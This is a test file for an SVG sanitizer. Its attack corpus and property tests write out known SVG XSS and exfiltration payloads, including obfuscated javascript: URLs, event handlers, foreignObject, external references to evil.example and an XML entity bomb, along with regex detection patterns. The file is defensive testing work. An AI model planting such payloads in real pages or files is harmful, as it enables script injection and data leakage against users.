import fc from 'fast-check';
import { describe, expect, it } from 'vitest';

import { buildSvg } from './build.js';
import { MAX_ELEMENTS, MAX_SVG_BYTES, sanitizeSvg } from './sanitize.js';

const svg = (inner: string, attrs = '') =>
  `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"${attrs}>${inner}</svg>`;

function rejection(input: string): string {
  const result = sanitizeSvg(input);
  if (result.ok) throw new Error('expected sanitize to reject the input');
  return result.reason;
}

function clean(input: string): string {
  const result = sanitizeSvg(input);
  if (!result.ok) throw new Error(`expected sanitize to succeed: ${result.reason}`);
  return result.svg;
}

/** Things that must never survive sanitization, in any output. */
function assertSafe(output: string): void {
  expect(output).not.toMatch(/<script/i);
  expect(output).not.toMatch(/<foreignObject/i);
  expect(output).not.toMatch(/<(a|image|iframe|object|embed)[\s>]/i);
  expect(output).not.toMatch(/\son[a-z]+\s*=/i);
  expect(output).not.toMatch(/javascript:|vbscript:/i);
  expect(output).not.toMatch(/@import/i);
  expect(output).not.toMatch(/(?:xlink:)?href="(?!#)/i);
  for (const [, inner = ''] of output.matchAll(/url\(([^)]*)\)?/gi)) {
    expect(
      inner
        .trim()
        .replace(/^(&quot;|['"])(.*)\1$/s, '$2')
        .trim(),
    ).toMatch(/^#/);
  }
}

// Known SVG XSS / data-exfiltration techniques. Each must be neutralized.
const ATTACKS: [string, string][] = [
  ['script element', svg('<script>alert(1)</script><path d="M0 0h24"/>')],
  ['script with xlink src', svg('<script xlink:href="https://evil.example/x.js"></script>')],
  ['onload on root', svg('<path d="M0 0"/>', ' onload="alert(1)"')],
  ['onclick on child', svg('<circle r="5" onclick="alert(1)"/>')],
  ['mixed-case handler', svg('<circle r="5" OnMouseOver="alert(1)"/>')],
  ['javascript: href on a', svg('<a href="javascript:alert(1)"><path d="M0 0"/></a>')],
  ['javascript: xlink:href on use', svg('<use xlink:href="javascript:alert(1)"/>')],
  ['external use reference', svg('<use href="https://evil.example/sprite.svg#icon"/>')],
  ['data: URI use', svg('<use href="data:image/svg+xml;base64,PHN2Zz4="/>')],
  ['foreignObject HTML', svg('<foreignObject><img src=x onerror="alert(1)"></foreignObject>')],
  ['image with external href', svg('<image href="https://evil.example/track.png"/>')],
  ['iframe', svg('<iframe src="https://evil.example"></iframe>')],
  ['style @import', svg('<style>@import url("https://evil.example/x.css");</style>')],
  ['style external url', svg('<style>.a{background:url(https://evil.example/t.png)}</style>')],
  ['inline style external url', svg('<rect style="fill:url(https://evil.example/x)"/>')],
  ['fill external url', svg('<rect fill="url(https://evil.example/x.svg#g)"/>')],
  ['css expression', svg('<rect style="width:expression(alert(1))"/>')],
  [
    'animate href to script',
    svg('<a><animate attributeName="href" values="javascript:alert(1)"/></a>'),
  ],
  ['set xlink:href', svg('<use><set attributeName="xlink:href" to="javascript:alert(1)"/></use>')],
  [
    'animate event attribute',
    svg('<circle><animate attributeName="onclick" to="alert(1)"/></circle>'),
  ],
  [
    'animate values with data uri',
    svg('<circle><animate attributeName="fill" values="data:x"/></circle>'),
  ],
  ['xml:base trick', svg('<g xml:base="javascript:alert(1)//"><use href="#a"/></g>')],
  ['entity-encoded javascript', svg('<a href="&#106;avascript:alert(1)"><path d="M0 0"/></a>')],
  ['tab-obfuscated javascript', svg('<use href="java\tscript:alert(1)"/>')],
];

describe('sanitizeSvg: attack corpus', () => {
  it.each(ATTACKS)('neutralizes %s', (_name, input) => {
    const result = sanitizeSvg(input);
    if (result.ok) {
      assertSafe(result.svg);
      expect(result.removed).toBeGreaterThan(0);
    }
  });

  it('rejects DOCTYPE and ENTITY declarations (XML bombs)', () => {
    const bomb = `<!DOCTYPE svg [<!ENTITY a "aaaa"><!ENTITY b "&a;&a;&a;">]>${svg('<text>&b;</text>')}`;
    expect(rejection(bomb)).toMatch(/DOCTYPE/);
  });

  it('rejects oversized input', () => {
    const big = svg(`<path d="${'M0 0 '.repeat(MAX_SVG_BYTES / 5 + 1)}"/>`);
    expect(rejection(big)).toMatch(/larger than/);
  });

  it('rejects too many elements', () => {
    const many = svg('<g/>'.repeat(MAX_ELEMENTS + 1));
    expect(rejection(many)).toMatch(/elements/);
  });

  it('rejects input that is not a single <svg> root', () => {
    expect(sanitizeSvg('<div>hi</div>').ok).toBe(false);
    expect(sanitizeSvg(svg('') + svg('')).ok).toBe(false);
    expect(sanitizeSvg('').ok).toBe(false);
    expect(sanitizeSvg('<script>alert(1)</script>').ok).toBe(false);
  });
});

describe('sanitizeSvg: legitimate icons survive', () => {
  it('keeps paths and presentation attributes unchanged', () => {
    const input = svg(
      '<path fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" d="M5 12h14"/>',
    );
    const result = sanitizeSvg(input);
    expect(result).toMatchObject({ ok: true, removed: 0 });
    expect(clean(input)).toContain('stroke-linecap="round"');
  });

  it('keeps gradients referenced by internal url(#id)', () => {
    const out = clean(
      svg(
        '<defs><linearGradient id="g"><stop offset="0" stop-color="red"/></linearGradient></defs><rect fill="url(#g)"/>',
      ),
    );
    expect(out).toContain('fill="url(#g)"');
    expect(out).toMatch(/<lineargradient|<linearGradient/);
  });

  it('keeps quoted internal url("#id") references (real-world gradient icons)', () => {
    const input = svg(
      '<defs><linearGradient id="b"/></defs><path fill="url(&quot;#b&quot;)"/><rect style="fill:url(\'#b\')"/>',
    );
    expect(sanitizeSvg(input)).toMatchObject({ ok: true, removed: 0 });
  });

  it('removes quoted external url() references', () => {
    const out = clean(svg('<path fill="url(&quot;https://evil.example/x#b&quot;)"/>'));
    expect(out).not.toContain('evil.example');
  });

  it('keeps internal <use> references', () => {
    expect(clean(svg('<defs><path id="p" d="M0 0"/></defs><use href="#p"/>'))).toContain(
      'href="#p"',
    );
  });

  it('keeps harmless animations (spinners)', () => {
    const out = clean(
      svg(
        '<circle r="4"><animate attributeName="opacity" values="1;0;1" dur="1s" repeatCount="indefinite"/></circle>',
      ),
    );
    expect(out).toMatch(/<animate/);
  });

  it('keeps self-contained <style>', () => {
    expect(clean(svg('<style>.a{fill:#f00}</style><rect class="a"/>'))).toContain('.a{fill:#f00}');
  });

  it('is idempotent on real icon markup', () => {
    const once = clean(buildSvg({ body: '<path d="M3 3h18v18H3z"/>', width: 24, height: 24 }));
    expect(clean(once)).toBe(once);
  });
});

// Property tests: random combinations of tags, attributes and payloads must always come out safe.
const TAGS = [
  'g',
  'path',
  'circle',
  'rect',
  'use',
  'a',
  'script',
  'style',
  'foreignObject',
  'image',
  'animate',
  'set',
];
const ATTRS = [
  'd',
  'fill',
  'style',
  'href',
  'xlink:href',
  'onload',
  'onclick',
  'attributeName',
  'values',
  'to',
  'class',
];
const VALUES = [
  'M0 0h24',
  'red',
  'url(#g)',
  'url(https://evil.example/x)',
  'javascript:alert(1)',
  '#local',
  'https://evil.example/',
  'href',
  'onclick',
  '@import url(x.css)',
  'data:text/html,<script>alert(1)</script>',
];

const attributes = fc
  .array(fc.tuple(fc.constantFrom(...ATTRS), fc.constantFrom(...VALUES)), { maxLength: 3 })
  .map((attrs) => attrs.map(([k, v]) => ` ${k}="${v.replaceAll('"', '&quot;')}"`).join(''));

// Depth-limited random SVG trees (unbounded recursion can build enormous documents).
const element: fc.Arbitrary<string> = fc.letrec<{ node: string }>((tie) => ({
  node: fc.oneof(
    { depthSize: 'small', withCrossShrink: true },
    fc.tuple(fc.constantFrom(...TAGS), attributes).map(([tag, a]) => `<${tag}${a}></${tag}>`),
    fc
      .tuple(fc.constantFrom(...TAGS), attributes, fc.array(tie('node'), { maxLength: 2 }))
      .map(([tag, a, children]) => `<${tag}${a}>${children.join('')}</${tag}>`),
  ),
})).node;

describe('sanitizeSvg: properties', () => {
  it('never lets dangerous constructs through', () => {
    fc.assert(
      fc.property(fc.array(element, { maxLength: 4 }), (children) => {
        const result = sanitizeSvg(svg(children.join('')));
        if (result.ok) assertSafe(result.svg);
      }),
      { numRuns: 500 },
    );
  });

  it('is idempotent: sanitizing clean output changes nothing', () => {
    fc.assert(
      fc.property(fc.array(element, { maxLength: 4 }), (children) => {
        const first = sanitizeSvg(svg(children.join('')));
        if (!first.ok) return;
        const second = sanitizeSvg(first.svg);
        expect(second).toMatchObject({ ok: true, svg: first.svg, removed: 0 });
      }),
      { numRuns: 300 },
    );
  });
});

describe('buildSvg', () => {
  it('wraps a body with the viewBox and namespaces', () => {
    expect(buildSvg({ body: '<use xlink:href="#a"/>', width: 16, height: 32 })).toBe(
      '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 16 32"><use xlink:href="#a"/></svg>',
    );
  });

  it('rejects invalid dimensions', () => {
    expect(() => buildSvg({ body: '', width: 0, height: 24 })).toThrow(RangeError);
    expect(() => buildSvg({ body: '', width: Number.NaN, height: 24 })).toThrow(RangeError);
  });
});
